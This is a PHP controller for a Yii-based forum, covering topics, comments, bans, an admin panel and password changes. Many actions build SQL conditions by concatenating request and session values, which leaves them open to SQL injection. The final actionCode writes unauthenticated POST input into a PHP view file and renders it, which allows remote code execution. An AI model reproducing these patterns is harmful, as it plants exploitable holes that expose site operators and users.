<?php

namespace app\controllers;

use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\SignupForm;
use app\models\signup;
use app\models\login;
use app\models\temi;
use app\models\com;
use app\models\users;
use app\models\create;
use app\models\creaty;
use app\models\bans;
use app\models\Redactori;

class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    /*Блок тем*/
    public function actionIndex($id = null)
    {
		if(isset($id))
		{
		if(!Yii::$app->user->isGuest){
		$ban = (Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->staty);
		$adm = (Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->previl);
    $bans = (Bans::find()
    ->where(["id_user" => Yii::$app->user->id, "id_temi"=> $id])
    ->one()
    ->staty);
		if($ban == 0 ){
			if($bans==0 or $adm== 1){
			$tema = Temi::find()->where(['id' => $id])->all();
			        $model = new Creaty();

        if(isset($_POST['Creaty']))
        {
           $model->attributes = Yii::$app->request->post('Creaty'); 

           if($model->validate() && $model->creaty())
           {
            $_SESSION['otv']=0;
		   return $this->redirect(['index?id='.$id.'']);
     }
           }
        }else{
			 return $this->goHome();
		}

        


		return $this->render('onetema',['tema' => $tema,'model'=>$model]);
		}else{
       return $this->goHome();	
		}
		}
		if(Yii::$app->user->isGuest){
			$stat = (Temi::find()
			->where("id = ".$id)
			->one()
			->stati);
			if($stat == 0){
		$tema = Temi::find()->where(['id' => $id])->all();
		return $this->render('onetema',['tema' => $tema]);
		}else{
		return $this->goHome();	
		}
		}
		}else{
		return $this->render('temi',compact('res','us'));
		}
		
	}
	

    /**
     * Login action.
     *
     * @return Response|string
     */
    /*Авторизация*/
    public function actionLogin()
    {
       if(!Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }

       $login_model = new Login();

       if( Yii::$app->request->post('Login'))
       {
        $login_model->attributes = Yii::$app->request->post('Login');

        if($login_model->validate())
        {
            Yii::$app->user->login($login_model->getUser());
            return $this->goHome();
        }
       }

       return $this->render('login',['login_model'=>$login_model]);
    }
     /*Блокировка в 1 клик*/
			public function actionUpdatau($id=null){
		if(!Yii::$app->user->isGuest)
       {
        $admin=(Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->previl);
		if($admin==1){
		$prem=(Users::find()
		->where("id = ".$id)
		->one()
		->staty);
		$perem=(Users::find()
		->where("id = ".$id)
		->one()
		->previl);
		$kd=(Users::find()
		->where("id = ".$id)
		->one()
		->id);
		$user=Users::findone($id);
		if($kd != 4){
		if($perem == 0 && $prem == 0 ){
		$user->previl = 1;
		}else{
		$user->previl = 0;
		};
		$user->save();
		if($user->save()){
		$this->redirect(['/site/users']);
		}

		}else{
		$this->redirect(['/site/users']);
	}
	if(Yii::$app->user->isGuest)
    {
    return $this->goHome();
    }
   }
}
			}
 /*Блокировка*/
		public function actionDelety($id=null){
		if(!Yii::$app->user->isGuest)
       {
        $admin=(Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->previl);
		if($admin==1){
		$perem=(Users::find()
		->where("id = ".$id)
		->one()
		->staty);	
		$user=Users::findone($id);
		if($perem == 0 && $id != 4){
		$user->staty = 1;
		$user->previl = 0;
		}else{
		$user->staty = 0;
		};
		$user->save();
		if($user->save()){
		$this->redirect(['/site/users']);
		}
		}else{
		return $this->goHome();
		};
		};
		if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
	}
    public function actionOtvet($id=null){
    if(!Yii::$app->user->isGuest)
       {
        $admin=(Users::find()
    ->where("id = ".Yii::$app->user->id)
    ->one()
    ->staty);
    if($admin==0){
    $_SESSION['otv']=$id;
    $this->redirect(['/site/index?id='.$_SESSION['now'].'']);
    }
    }else{
    return $this->goHome();
    };
    if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
  }


    /**
     * Logout action.
     *
     * @return Response
     */
     /*Выход*/
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    /*public function actionRegister()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');

            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }*/
     /*Регистрация*/
    public function actionRegister()
    {
		if(!Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
        $model = new Signup();

        if(isset($_POST['Signup']))
        {
           $model->attributes = Yii::$app->request->post('Signup'); 

           if($model->validate() && $model->signup())
           {
		   return $this->redirect(['login']);
           }
        }


        return $this->render('signup', ['model'=>$model]);
    }
	
	 /*Создание блоков*/
	    public function actionCreate()
    {
		if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
        $model = new Create();

        if(isset($_POST['Create']))
        {
           $model->attributes = Yii::$app->request->post('Create'); 

           if($model->validate() && $model->create())
           {
		   return $this->redirect(['index']);
           }
        }


        return $this->render('create', ['model'=>$model]);
    }
     /*Админ-панель*/
	public function actionAdmin(){
		if(!Yii::$app->user->isGuest)
       {
		 $adm = (Users::find()
			->where("id = ".Yii::$app->user->id)
			->one()
			->previl);
			if($adm == 0){
				return $this->goHome();
			}
	   }
		if(Yii::$app->user->isGuest){
			return $this->goHome();	
		}
		return $this->render('admin');
	}
  /*список пользователей для админа*/
		public function actionUsers($id = Null, $pas =null){
		if(!Yii::$app->user->isGuest)
       {
		 $admin = (Users::find()
			->where("id = ".Yii::$app->user->id)
			->one()
			->previl);
			if($admin == 0){
				return $this->goHome();
			}
	   }
		if(Yii::$app->user->isGuest){
			return $this->goHome();	
		}
		if(isset($id)){
			$_SESSION['rel']=$id;
			if($id==4){
				if(Yii::$app->user->id ==$id){
          $model = new Redactori();

        if(isset($_POST['Redactori']))
        {
           $model->attributes = Yii::$app->request->post('Redactori'); 

           if($model->validate() && $model->signup())
           {
		   return $this->redirect(['users']);
           }
      }
		
		}else{
			$this->redirect(['/site/users']);
		}
			}
			if($id!=4){
			$_SESSION['rel']=$id;
          $model = new Redactori();

        if(isset($_POST['Redactori']))
        {
           $model->attributes = Yii::$app->request->post('Redactori'); 

           if($model->validate() && $model->signup())
           {
		   return $this->redirect(['users']);
           }
      }		}
			return $this->render('redactori', ['id'=>$id,'model'=>$model]);

		}
	
	if(isset($pas)){
		if($pas==4){
				if(Yii::$app->user->id == $pas){
          $model = new Signup();
		if($model->load(\yii::$app->request->post())){
			$temi = Users::findOne($pas);
			$temi->password = Yii::$app->getSecurity()->generatePasswordHash($model->password);
			$temi->save();
			if($temi->save()){
				$this->redirect(['/site/users']);
			}
		}
	}else{
		$this->redirect(['/site/users']);
	}
		}
			$model = new Signup();
		if($model->load(\yii::$app->request->post())){
			$temi = Users::findOne($pas);
			$temi->password = Yii::$app->getSecurity()->generatePasswordHash($model->password);
			$temi->save();
			if($temi->save()){
				$this->redirect(['/site/users']);
			}
		}
	
	return $this->render('redactorp', ['id'=>$pas,'model'=>$model]);
	}
		return $this->render('allusers');
		}
	

  /*Список тем для админа*/
	public function actionTemi($spis=null){
		if(!Yii::$app->user->isGuest)
       {
		 $admin = (Users::find()
			->where("id = ".Yii::$app->user->id)
			->one()
			->previl);
			if($admin == 0){
				return $this->goHome();
			}
			if(isset($spis)){
      $_SESSION['spis']=$spis;
        $model = new Create();
		if($model->load(\yii::$app->request->post())){
			$temi = Temi::findOne($spis);
			$temi->name = $model->name;
			$temi->stati = $model->stati;
			$temi->text = $model->text;
			$temi->save();
			if($temi->save()){
				$this->redirect(['/site/temi']);
			}
		}
		        return $this->render('redactor', ['model'=>$model]);
    }
	   }
		if(Yii::$app->user->isGuest){
			return $this->goHome();	
		}
		return $this->render('alltemi');
	}
	
	

    /**
     * Displays about page.
     *
     * @return string
     */
     /*Профиль*/
    public function actionProfile($id=null, $spis=null)
	{
	   if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }else{
	    $admin=(Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->staty);
		if($admin== 0){
	   if(isset($id))
		{
		if(!Yii::$app->user->isGuest){
		$ban = (Temi::find()
		->where("id = ".$id)
		->one()
		->id_sozd);
		if($ban == Yii::$app->user->id){
			$redac = Temi::find()->where(['id' => $id])->all();
		return $this->render('redact',['redac' => $redac]);
		}
		}
    }if(isset($spis)){
      $_SESSION['spis']=$spis;
		if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
		if(!Yii::$app->user->isGuest){
		$ban = (Temi::find()
		->where("id = ".$spis)
		->one()
		->id_sozd);
		if($ban == Yii::$app->user->id){
        $model = new Create();
		if($model->load(\yii::$app->request->post())){
			$temi = Temi::findOne($spis);
			$temi->name = $model->name;
			$temi->stati = $model->stati;
			$temi->text = $model->text;
			$temi->save();
			if($temi->save()){
				$this->redirect(['/site/profile']);
			}
		}
		        return $this->render('redactor', ['model'=>$model]);
    }
		}
	}
	 return $this->render('about');
		}else{
			return $this->goHome();
		}
	   }
	}
	   
	
		public function actionBan($id=null){
		if(!Yii::$app->user->isGuest)
       {
        $admin=(Temi::find()
		->where("id = ".$_SESSION['tem'])
		->one()
		->id_sozd);
		$adm=(Users::find()
		->where("id = ".$id)
		->one()
		->previl);
		if($admin==Yii::$app->user->id){
		$perem=(Users::find()
		->where("id = ".$id)
		->one()
		->previl);	
		$bans = new Bans;
		if($perem != 1 or $adm!=1){
		$bans->id_user = $id;
		$bans->id_temi = $_SESSION['tem'];
		$bans->staty = 1;
		$bans->save();
		if($bans->save()){
		$this->redirect(['/site/profile?id='.$_SESSION['tem'].'']);
		}
		}else{
		   $this->redirect(['/site/profile?id='.$_SESSION['tem'].'']);
		};
		}

		};
		if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
	}
	    public function actionUnban($id_user=null){
		if(!Yii::$app->user->isGuest)
       {
		$admin=(Temi::find()
		->where("id = ".$_SESSION['tem'])
		->one()
		->id_sozd);
		if($admin==Yii::$app->user->id){
		   $res = Bans::find()->where("id_user=".$id_user)->one();
		   $res->delete();
		   $this->redirect(['/site/profile?id='.$_SESSION['tem'].'']);
    }else{
		   $this->redirect(['/site/profile?id='.$_SESSION['tem'].'']);
    };
    if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
	   }
		}
	   
	   public function actionDelete($del=null){
		if(!Yii::$app->user->isGuest)
       {
		$admin=(Com::find()
		->where("id = ".$del)
		->one()
		->id_user);
	if($admin==Yii::$app->user->id){
		   $res = Com::findOne($del);
		    $resk = Com::find()->where(['id_coment'=>$del])->all();
		   foreach($resk as $kay){
			$coments = Com::find()->where(['id_coment'=>$del])->one();
		   $coments->delete();  
		   }
		   $res->delete();
		   $this->redirect(['/site/index?id='.$_SESSION['now'].'']);
    }else{
    return 	$this->redirect(['/site/index?id='.$_SESSION['now'].'']);
    };
    if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
  }
}
public function actionDel($id=null){
		if(!Yii::$app->user->isGuest)
       {
		$adm=(Users::find()
		->where("id = ".Yii::$app->user->id)
		->one()
		->previl);
		if($adm==1){
		   $res = Temi::findOne($id);
		   $resy = Bans::find()->where(['id_temi'=>$id])->all();
		   $resk = Com::find()->where(['id_temi'=>$id])->all();
		   foreach($resy as $key){
			$resc = Bans::find()->where(['id_temi'=>$id])->one();
		   $resc->delete();
		   }
		   foreach($resk as $kay){
			$coments = Com::find()->where(['id_temi'=>$id])->one();
		   $coments->delete();  
		   }
		   $res->delete();
		   $this->redirect(['/site/temi']);
    }else{
    return 	$this->redirect(['/site/index']);
    }
	   }
}
	public function actionDely($id=null){
		if(!Yii::$app->user->isGuest)
		if(!Yii::$app->user->isGuest)
       {
		$admin=(Temi::find()
		->where("id = ".$id)
		->one()
		->id_sozd);
	if($admin==Yii::$app->user->id){
		   $res = Temi::findOne($id);
		   $resy = Bans::find()->where(['id_temi'=>$id])->all();
		   $resk = Com::find()->where(['id_temi'=>$id])->all();
		   foreach($resy as $key){
			$resc = Bans::find()->where(['id_temi'=>$id])->one();
		   $resc->delete();
		   }
		   foreach($resk as $kay){
			$coments = Com::find()->where(['id_temi'=>$id])->one();
		   $coments->delete();
		   }
		   $res->delete();
		   $this->redirect(['/site/profile']);
    if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
  }
	   }
}
	   public function actionDeleti($del=null){
		if(!Yii::$app->user->isGuest)
		$adm=(Users::find()
		->where("id = ".$_SESSION['now'])
		->one()
		->id_sozd);
	if($adm==Yii::$app->user->id){
		   $res = Com::findOne($del);
		   $resk = Com::find()->where(['id_coment'=>$del])->all();
		   foreach($resk as $kay){
			$coments = Com::find()->where(['id_coment'=>$del])->one();
		   $coments->delete();  
		   }
		   $res->delete();
		   $this->redirect(['/site/index?id='.$_SESSION['now'].'']);
    }else{
    return 	$this->redirect(['/site/index?id='.$_SESSION['now'].'']);
    }
	   }
	public function actionRename($id=null){
    if(!Yii::$app->user->isGuest)
       {
        $admin=(Users::find()
    ->where("id = ".Yii::$app->user->id)
    ->one()
    ->staty);
    if($admin==0){
    $_SESSION['tex']=$id;
    $this->redirect(['/site/profile']);
    }
    }else{
    return $this->goHome();
    };
    if(Yii::$app->user->isGuest)
       {
        return $this->goHome();
       }
  }
  public function actionCode()
    {
        if(isset($_POST['name']))
        {
            $_SESSION['codetest']=$_POST['name'];
            file_put_contents("../views/site/codetest.php", $_POST['name']);
            return $this->redirect(['code']);
        }
        return $this->render('code');
    }
}



